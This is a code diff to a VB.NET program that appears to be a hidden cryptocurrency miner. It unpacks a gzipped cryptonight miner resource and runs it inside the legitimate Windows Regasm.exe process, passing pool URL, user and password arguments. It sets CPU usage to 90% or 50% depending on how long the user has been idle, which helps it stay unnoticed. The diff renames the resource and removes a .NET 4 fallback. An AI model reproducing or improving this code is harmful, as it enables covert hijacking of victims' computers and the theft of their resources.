@@ -130,7 +130,7 @@ Public Class Main
         Try
             Try
                 If cpu.Contains("<CUS>") Then
-                    Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", cpu.Split("<CUS>")(0), GZip(My.Resources.xm), True)
+                    Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", cpu.Split("<CUS>")(0), GZip(My.Resources.cpu), True)
                     Return
                 End If
             Catch ex As Exception
@@ -154,9 +154,8 @@ Public Class Main
                     Kill()
 
                     Try
-                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & Environment.ProcessorCount & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=90", GZip(My.Resources.xm), True)
+                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & Environment.ProcessorCount & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=90", GZip(My.Resources.cpu), True)
                     Catch ex As Exception
-                        Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=0 -t " & Environment.ProcessorCount & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=90", GZip(My.Resources.xm), True)
                     End Try
 
                 ElseIf FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0) < TimeOUT AndAlso active = False Then
@@ -165,9 +164,8 @@ Public Class Main
                     Kill()
 
                     Try
-                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=50", GZip(My.Resources.xm), True)
+                        Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=50", GZip(My.Resources.cpu), True)
                     Catch ex As Exception
-                        Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=50", GZip(My.Resources.xm), True)
                     End Try
 
                 End If
